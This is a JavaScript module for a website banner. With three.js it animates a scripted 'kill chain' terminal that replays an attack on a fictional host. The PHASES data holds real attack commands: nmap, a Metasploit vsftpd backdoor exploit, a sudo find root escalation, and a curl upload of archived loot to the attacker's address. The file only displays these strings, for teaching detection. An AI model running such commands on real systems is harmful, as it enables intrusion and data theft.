/* ============================================================
   HERO · Operation Glassfall
   A live kill-chain simulation: 3D pipeline + synced Kali CLI.
   One clock drives everything; chips jump between phases.
   ============================================================ */
import * as THREE from "three";
import { EffectComposer } from "three/addons/postprocessing/EffectComposer.js";
import { RenderPass } from "three/addons/postprocessing/RenderPass.js";
import { UnrealBloomPass } from "three/addons/postprocessing/UnrealBloomPass.js";
import { OutputPass } from "three/addons/postprocessing/OutputPass.js";
import {
  PALETTE,
  REDUCED,
  makeRenderer,
  fitRenderer,
  onResize,
  softDot,
  Loop,
  autoRun,
  clamp01,
} from "../core/three-utils.js";

/* ---------- Attack script (educational simulation) ---------- */
const PHASES = [
  {
    name: "RECONNAISSANCE",
    dur: 9,
    lines: [
      { out: "Sea of Glass · attack simulation v1.0", cls: "dim" },
      { out: "sandbox: kali@10.8.0.7 → target: glasscorp.io", cls: "dim" },
      { cmd: "host glasscorp.io" },
      { out: "glasscorp.io has address 10.10.14.2", cls: "dim" },
      { out: "[+] target resolved — moving to scanning", cls: "ok" },
    ],
  },
  {
    name: "SCANNING",
    dur: 10,
    lines: [
      { cmd: "nmap -sV -T4 10.10.14.2" },
      { out: "21/tcp  open  ftp   vsftpd 2.3.4", cls: "dim" },
      { out: "22/tcp  open  ssh   OpenSSH 8.2p1", cls: "dim" },
      { out: "80/tcp  open  http  Apache 2.4.49", cls: "dim" },
      { out: "[!] vsftpd 2.3.4 → backdoor (CVE-2011-2523)", cls: "warn" },
    ],
  },
  {
    name: "EXPLOITATION",
    dur: 11,
    lines: [
      { cmd: "searchsploit vsftpd 2.3.4" },
      { out: "vsftpd 2.3.4 — Backdoor Command Execution", cls: "dim" },
      {
        cmd: 'msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 10.10.14.2; run"',
      },
      { out: "[+] 10.10.14.2:21 — command shell session 1 opened", cls: "ok" },
    ],
  },
  {
    name: "PRIVILEGE ESCALATION",
    dur: 11,
    lines: [
      { cmd: "whoami" },
      { out: "www-data", cls: "dim" },
      { cmd: "sudo -l" },
      { out: "(ALL) NOPASSWD: /usr/bin/find", cls: "warn" },
      { cmd: "sudo find . -exec /bin/sh \\; -quit" },
      { cmd: "id" },
      { out: "uid=0(root) gid=0(root) groups=0(root)", cls: "ok" },
    ],
  },
  {
    name: "EXFILTRATION",
    dur: 11,
    lines: [
      { cmd: "tar czf loot.tgz /var/www/backup" },
      { out: "loot.tgz — 42 MB archived", cls: "dim" },
      { cmd: "curl -T loot.tgz ftp://10.8.0.7/" },
      { out: "100%  42.0M uploaded", cls: "dim" },
      { cmd: "cat /root/flag.txt" },
      { out: "FLAG{s3a_0f_gl4ss}", cls: "flag" },
      { out: "[+] objective complete — data exfiltrated", cls: "bad" },
    ],
  },
  {
    name: "TARGET COMPROMISED",
    dur: 6,
    lines: [
      { out: "== TARGET COMPROMISED ==", cls: "bad" },
      { out: "chain: recon → scan → exploit → escalate → exfil", cls: "dim" },
      { out: "now learn to detect every step of it ↗", cls: "ok" },
    ],
  },
  {
    name: "RESTORING RANGE",
    dur: 4,
    lines: [
      { cmd: "clear" },
      { out: "── blue team engaged · environment restored ──", cls: "ok" },
      { out: "restarting simulation…", cls: "dim" },
    ],
  },
];

/* ---------- Terminal: typewriter driven by the sim clock ---------- */
class Terminal {
  constructor(body) {
    this.body = body;
    this.reset();
  }
  reset() {
    this.body.innerHTML = "";
    this.queue = [];
    this.job = null;
    this.open = null;
    this.wait = 0;
    this.acc = 0;
  }
  enqueue(lines) {
    this.queue.push(...lines);
  }
  newPrompt() {
    const line = document.createElement("div");
    line.className = "t-line";
    line.innerHTML =
      '<span class="t-prompt">shidoon@kali</span><span class="t-path">:~$</span> <span class="t-cmd"></span><span class="t-caret">▊</span>';
    this.body.appendChild(line);
    this.open = line.querySelector(".t-cmd");
    this.caret = line.querySelector(".t-caret");
    this.trim();
    this.scroll();
  }
  out(text, cls) {
    const d = document.createElement("div");
    d.className = "t-line t-out " + (cls || "");
    d.textContent = text;
    this.body.appendChild(d);
    this.trim();
    this.scroll();
  }
  trim() {
    while (this.body.children.length > 70) this.body.firstChild.remove();
  }
  scroll() {
    this.body.scrollTop = this.body.scrollHeight;
  }
  update(dt) {
    if (this.wait > 0) {
      this.wait -= dt;
      return;
    }
    if (!this.job) {
      const next = this.queue.shift();
      if (!next) return;
      if (next.cmd !== undefined) {
        if (!this.open) this.newPrompt();
        this.job = { text: next.cmd, i: 0 };
        this.acc = 0;
      } else {
        this.out(next.out, next.cls);
        this.wait = 0.13;
      }
      return;
    }
    this.acc += dt * 34; // typing speed (chars/sec)
    const n = Math.min(this.job.text.length, Math.floor(this.acc));
    if (n > this.job.i) {
      this.open.textContent = this.job.text.slice(0, n);
      this.job.i = n;
      this.scroll();
    }
    if (this.job.i >= this.job.text.length) {
      const text = this.job.text;
      this.caret.remove();
      this.open = null;
      this.job = null;
      this.wait = 0.3;
      if (text === "clear") {
        this.body.innerHTML = "";
      }
    }
  }
  flush() {
    // render everything instantly (used when jumping while paused)
    if (this.job) {
      this.open.textContent = this.job.text;
      this.caret.remove();
      this.open = null;
      if (this.job.text === "clear") this.body.innerHTML = "";
      this.job = null;
    }
    let item;
    while ((item = this.queue.shift())) {
      if (item.cmd !== undefined) {
        this.newPrompt();
        this.open.textContent = item.cmd;
        this.caret.remove();
        this.open = null;
        if (item.cmd === "clear") this.body.innerHTML = "";
      } else this.out(item.out, item.cls);
    }
    this.wait = 0;
  }
}

/* ---------- Simulation clock: single source of truth ---------- */
class AttackSim {
  constructor(els) {
    this.els = els;
    this.term = new Terminal(els.termBody);
    this.view = null;
    this.playing = true;
    this.t = 0;
    this.phase = -1;
    this.p = 0;
    this.starts = [];
    let acc = 0;
    PHASES.forEach((ph) => {
      this.starts.push(acc);
      acc += ph.dur;
    });
    this.total = acc;
  }
  indexAt(t) {
    for (let i = PHASES.length - 1; i >= 0; i--)
      if (t >= this.starts[i]) return i;
    return 0;
  }
  enter(idx) {
    this.phase = idx;
    const ph = PHASES[idx];
    this.term.enqueue(ph.lines);
    this.view && this.view.setStage(idx);
    // HUD: chips + status
    this.els.chips.forEach((c, i) => {
      c.classList.toggle("active", i === idx);
      c.classList.toggle("done", i < idx || idx >= 5);
    });
    this.els.status.textContent =
      idx < 5
        ? `PHASE 0${idx + 1} / 05 — ${ph.name}`
        : idx === 5
          ? "!! TARGET COMPROMISED !!"
          : "BLUE TEAM — RESTORING RANGE";
    this.els.status.style.color =
      idx === 5 ? "var(--red)" : idx === 6 ? "var(--teal)" : "";
  }
  update(dt) {
    if (this.playing) {
      this.t += dt;
      if (this.t >= this.total) {
        this.t -= this.total;
        this.phase = -1;
      }
    }
    const idx = this.indexAt(this.t);
    if (idx !== this.phase) this.enter(idx);
    this.p = clamp01((this.t - this.starts[idx]) / PHASES[idx].dur);
    if (this.playing) this.term.update(dt);
    this.els.bar.style.transform = `scaleX(${this.t / this.total})`;
  }
  jump(i) {
    this.t = this.starts[i] + 0.001;
    this.phase = -1;
    this.term.reset();
    this.update(0);
    if (!this.playing) this.term.flush();
  }
}

/* ---------- 3D pipeline view ---------- */
const NODE_DEFS = [
  { name: "KALI · YOU", pos: [-11.2, 0.5, 1.6], kind: "src" },
  { name: "RECON", pos: [-7.4, 1.7, -1.2] },
  { name: "SCAN", pos: [-3.6, 0.7, 1.4] },
  { name: "EXPLOIT", pos: [0.2, 2.1, -1.6] },
  { name: "ESCALATE", pos: [4, 0.9, 1] },
  { name: "EXFIL", pos: [7.6, 1.7, -1] },
  { name: "TARGET", pos: [11.2, 1.1, 1.4], kind: "vault" },
];

class PipelineView {
  constructor(canvas, labelWrap) {
    this.renderer = makeRenderer(canvas);
    this.scene = new THREE.Scene();
    this.scene.background = new THREE.Color(PALETTE.bg);
    this.scene.fog = new THREE.FogExp2(PALETTE.bg, 0.026);
    this.camera = new THREE.PerspectiveCamera(42, 1, 0.1, 120);
    this.camera.position.set(0, 7, 17.5);
    this.pointer = { x: 0, y: 0 };
    this.pulses = [];
    this.alarm = false;

    // Post: gentle bloom for the cyber glow
    this.composer = new EffectComposer(this.renderer);
    this.composer.addPass(new RenderPass(this.scene, this.camera));
    this.bloom = new UnrealBloomPass(
      new THREE.Vector2(600, 400),
      0.85,
      0.55,
      0.22,
    );
    this.composer.addPass(this.bloom);
    this.composer.addPass(new OutputPass());

    // Lights: cool key, violet rim, one travelling "attack" light
    this.scene.add(new THREE.AmbientLight(0x2a3550, 1.2));
    const key = new THREE.DirectionalLight(0x9fd8ff, 2.2);
    key.position.set(-6, 10, 6);
    const rim = new THREE.DirectionalLight(PALETTE.violet, 1.1);
    rim.position.set(8, 4, -8);
    this.attackLight = new THREE.PointLight(PALETTE.red, 0, 16, 2);
    this.scene.add(key, rim, this.attackLight);

    // Floor: dark glassy plane + fading grid
    const floor = new THREE.Mesh(
      new THREE.PlaneGeometry(100, 60),
      new THREE.MeshPhongMaterial({
        color: 0x0a1120,
        shininess: 70,
        specular: 0x1c3a5f,
      }),
    );
    floor.rotation.x = -Math.PI / 2;
    floor.position.y = -1.4;
    const grid = new THREE.GridHelper(100, 70, 0x1d3050, 0x101a2e);
    grid.position.y = -1.39;
    grid.material.transparent = true;
    grid.material.opacity = 0.5;
    this.scene.add(floor, grid);

    // Nodes
    this.dot = softDot();
    this.ringGeo = new THREE.RingGeometry(0.5, 0.56, 48);
    const coreGeo = new THREE.IcosahedronGeometry(0.5, 1);
    const shellGeo = new THREE.IcosahedronGeometry(0.85, 1);
    const ringGeoN = new THREE.TorusGeometry(1.05, 0.016, 8, 72);
    this.nodes = NODE_DEFS.map((def, i) => {
      const g = new THREE.Group();
      g.position.set(...def.pos);
      const base = new THREE.Color(i === 0 ? PALETTE.cyan : PALETTE.cyan);
      const core = new THREE.Mesh(
        def.kind === "vault"
          ? new THREE.OctahedronGeometry(0.8, 0)
          : def.kind === "src"
            ? new THREE.TetrahedronGeometry(0.55, 0)
            : coreGeo,
        new THREE.MeshStandardMaterial({
          color: base.clone(),
          emissive: base.clone(),
          emissiveIntensity: 0.8,
          roughness: 0.3,
          metalness: 0.5,
        }),
      );
      const shell = new THREE.Mesh(
        def.kind === "vault"
          ? new THREE.IcosahedronGeometry(1.25, 1)
          : shellGeo,
        new THREE.MeshBasicMaterial({
          color: base.clone(),
          wireframe: true,
          transparent: true,
          opacity: 0.26,
        }),
      );
      const ring = new THREE.Mesh(
        ringGeoN,
        new THREE.MeshBasicMaterial({
          color: base.clone(),
          transparent: true,
          opacity: 0.5,
          blending: THREE.AdditiveBlending,
        }),
      );
      ring.rotation.x = 1.35;
      if (def.kind === "vault") {
        ring.scale.setScalar(1.4);
        core.scale.setScalar(1.15);
      }
      g.add(core, shell, ring);
      this.scene.add(g);
      // DOM label projected each frame
      const label = document.createElement("span");
      label.innerHTML = `<i>0${i}</i>${def.name}`;
      if (i === 0) label.innerHTML = def.name;
      if (def.kind === "vault") label.innerHTML = `<i>◎</i>${def.name}`;
      labelWrap.appendChild(label);
      return {
        group: g,
        core,
        shell,
        ring,
        label,
        baseY: def.pos[1],
        i,
        target: base.clone(),
        kind: def.kind,
      };
    });

    // Segments: raised curves between nodes
    this.segs = [];
    for (let i = 0; i < this.nodes.length - 1; i++) {
      const a = this.nodes[i].group.position,
        b = this.nodes[i + 1].group.position;
      const mid = a.clone().lerp(b, 0.5);
      mid.y += 1.1;
      const curve = new THREE.CatmullRomCurve3([a.clone(), mid, b.clone()]);
      const mat = new THREE.MeshBasicMaterial({
        color: PALETTE.tube,
        transparent: true,
        opacity: 0.85,
      });
      const mesh = new THREE.Mesh(
        new THREE.TubeGeometry(curve, 48, 0.03, 8),
        mat,
      );
      this.scene.add(mesh);
      this.segs.push({ curve, mat, target: new THREE.Color(PALETTE.tube) });
    }

    // Travelling packets (shared geometry/material)
    const pktGeo = new THREE.SphereGeometry(0.09, 12, 12);
    const pktMat = new THREE.MeshBasicMaterial({ color: PALETTE.red });
    this.packets = Array.from({ length: 4 }, () => {
      const m = new THREE.Mesh(pktGeo, pktMat);
      const glow = new THREE.Sprite(
        new THREE.SpriteMaterial({
          map: this.dot,
          color: PALETTE.red,
          transparent: true,
          blending: THREE.AdditiveBlending,
          depthWrite: false,
          opacity: 0.9,
        }),
      );
      glow.scale.setScalar(0.85);
      m.add(glow);
      m.visible = false;
      this.scene.add(m);
      return m;
    });

    // Ambient drifting particles
    const n = 240,
      pos = new Float32Array(n * 3);
    for (let i = 0; i < n; i++) {
      pos[i * 3] = (Math.random() - 0.5) * 34;
      pos[i * 3 + 1] = Math.random() * 8 - 1;
      pos[i * 3 + 2] = (Math.random() - 0.5) * 14;
    }
    const pGeo = new THREE.BufferGeometry();
    pGeo.setAttribute("position", new THREE.BufferAttribute(pos, 3));
    this.dust = new THREE.Points(
      pGeo,
      new THREE.PointsMaterial({
        size: 0.07,
        map: this.dot,
        color: 0x66d9ff,
        transparent: true,
        opacity: 0.5,
        blending: THREE.AdditiveBlending,
        depthWrite: false,
      }),
    );
    this.scene.add(this.dust);

    // Pointer parallax
    const wrap = canvas.parentElement;
    wrap.addEventListener("pointermove", (e) => {
      const r = wrap.getBoundingClientRect();
      this.pointer.x = ((e.clientX - r.left) / r.width - 0.5) * 2;
      this.pointer.y = ((e.clientY - r.top) / r.height - 0.5) * 2;
    });
    wrap.addEventListener("pointerleave", () => {
      this.pointer.x = 0;
      this.pointer.y = 0;
    });

    onResize(canvas, () =>
      fitRenderer(canvas, this.renderer, this.camera, this.composer),
    );
    this._v = new THREE.Vector3();
  }

  pulse(position, colorHex) {
    const mat = new THREE.MeshBasicMaterial({
      color: colorHex,
      transparent: true,
      opacity: 0.9,
      side: THREE.DoubleSide,
      blending: THREE.AdditiveBlending,
      depthWrite: false,
    });
    const m = new THREE.Mesh(this.ringGeo, mat);
    m.position.copy(position);
    this.scene.add(m);
    this.pulses.push({ m, life: 0.9, max: 0.9 });
  }

  /* Set target colours for a phase (lerped every frame) */
  setStage(idx) {
    const RED = new THREE.Color(PALETTE.red),
      CYAN = new THREE.Color(PALETTE.cyan),
      TEAL = new THREE.Color(PALETTE.teal);
    this.nodes.forEach((n, i) => {
      let t = CYAN;
      if (idx === 6) t = TEAL;
      else if (i > 0 && (idx >= 5 || i <= idx + 1)) t = RED;
      n.target.copy(t);
      n.label.classList.toggle("hot", t === RED);
    });
    this.segs.forEach((s, i) =>
      s.target.copy(
        idx === 6
          ? TEAL
          : idx >= 5 || i <= idx
            ? RED
            : new THREE.Color(PALETTE.tube),
      ),
    );
    this.alarm = idx === 5;
    const focus = this.nodes[Math.min(idx + 1, 6)];
    this.pulse(focus.group.position, idx === 6 ? PALETTE.teal : PALETTE.red);
  }

  update(dt, t, sim) {
    const k = Math.min(1, dt * 3.5);
    // Nodes: colour lerp, spin, bob
    this.nodes.forEach((n) => {
      n.core.material.color.lerp(n.target, k);
      n.core.material.emissive.lerp(n.target, k);
      n.shell.material.color.lerp(n.target, k);
      n.ring.material.color.lerp(n.target, k);
      n.group.position.y = n.baseY + Math.sin(t * 1.1 + n.i) * 0.12;
      n.shell.rotation.y += dt * 0.5;
      n.shell.rotation.x += dt * 0.18;
      n.ring.rotation.z += dt * 0.7;
      n.core.rotation.y -= dt * 0.3;
      const targetI =
        this.alarm && n.kind === "vault" ? 1.2 + Math.sin(t * 16) * 0.8 : 0.85;
      n.core.material.emissiveIntensity +=
        (targetI - n.core.material.emissiveIntensity) * k;
    });
    this.segs.forEach((s) => s.mat.color.lerp(s.target, k));

    // Packets flow along the active segment
    const active = sim.phase >= 0 && sim.phase < 5;
    this.packets.forEach((m, j) => {
      if (!active) {
        m.visible = false;
        return;
      }
      const u = clamp01(sim.p * 1.3 - j * 0.16);
      m.visible = u > 0.001 && u < 0.999;
      if (m.visible) this.segs[sim.phase].curve.getPointAt(u, m.position);
    });

    // Travelling attack light
    const focus = this.nodes[Math.min(Math.max(sim.phase, 0) + 1, 6)];
    this.attackLight.position.lerp(focus.group.position, k);
    this.attackLight.color.lerp(
      new THREE.Color(sim.phase === 6 ? PALETTE.teal : PALETTE.red),
      k,
    );
    const li = sim.phase < 5 ? 2.6 : sim.phase === 5 ? 3.6 : 0;
    this.attackLight.intensity += (li - this.attackLight.intensity) * k;

    // Activation pulses (billboarded rings)
    for (let i = this.pulses.length - 1; i >= 0; i--) {
      const p = this.pulses[i];
      p.life -= dt;
      const f = Math.max(0, p.life / p.max);
      p.m.scale.setScalar(1 + (1 - f) * 2.6);
      p.m.material.opacity = f * 0.9;
      p.m.quaternion.copy(this.camera.quaternion);
      if (p.life <= 0) {
        this.scene.remove(p.m);
        p.m.material.dispose();
        this.pulses.splice(i, 1);
      }
    }

    this.dust.rotation.y += dt * 0.02;

    // Camera: slow drift + damped pointer parallax
    const drift = REDUCED ? 0 : 1;
    const dx = Math.sin(t * 0.1) * 0.6 * drift + this.pointer.x * 1.4 * drift;
    const dy =
      7 + Math.sin(t * 0.13) * 0.3 * drift - this.pointer.y * 0.8 * drift;
    this.camera.position.x +=
      (dx - this.camera.position.x) * Math.min(1, dt * 2.5);
    this.camera.position.y +=
      (dy - this.camera.position.y) * Math.min(1, dt * 2.5);
    this.camera.lookAt(0, 1.1, 0);

    // Projected DOM labels
    const w = this.renderer.domElement.clientWidth,
      h = this.renderer.domElement.clientHeight;
    this.nodes.forEach((n) => {
      this._v.copy(n.group.position);
      this._v.y += 1.5;
      this._v.project(this.camera);
      if (this._v.z > 1) {
        n.label.style.opacity = 0;
        return;
      }
      n.label.style.opacity = 1;
      n.label.style.transform = `translate3d(${(this._v.x * 0.5 + 0.5) * w}px, ${(-this._v.y * 0.5 + 0.5) * h}px, 0) translate(-50%,-110%)`;
    });

    this.composer.render();
  }
}

/* ---------- Boot ---------- */
const section = document.getElementById("top");
const canvas = document.getElementById("hero-canvas");
if (section && canvas) {
  const els = {
    termBody: document.getElementById("hero-term-body"),
    chips: [...document.querySelectorAll("#sim-chips button")],
    status: document.getElementById("sim-phase"),
    bar: document.getElementById("sim-bar"),
  };
  const sim = new AttackSim(els);
  try {
    sim.view = new PipelineView(canvas, document.getElementById("hero-labels"));
  } catch {
    document.getElementById("hero-fallback").classList.add("show");
    canvas.style.display = "none";
  }
  const loop = new Loop((dt, t) => {
    sim.update(dt);
    sim.view && sim.view.update(dt, t, sim);
  });
  autoRun(section, loop);

  // Controls
  els.chips.forEach((c) =>
    c.addEventListener("click", () => sim.jump(+c.dataset.phase)),
  );
  document
    .getElementById("sim-replay")
    .addEventListener("click", () => sim.jump(0));
  const pauseBtn = document.getElementById("sim-pause");
  pauseBtn.addEventListener("click", () => {
    sim.playing = !sim.playing;
    pauseBtn.setAttribute("aria-pressed", String(!sim.playing));
    pauseBtn.setAttribute(
      "aria-label",
      sim.playing ? "Pause simulation" : "Play simulation",
    );
    pauseBtn
      .querySelector(".ic-pause")
      .classList.toggle("hidden", !sim.playing);
    pauseBtn.querySelector(".ic-play").classList.toggle("hidden", sim.playing);
  });
}
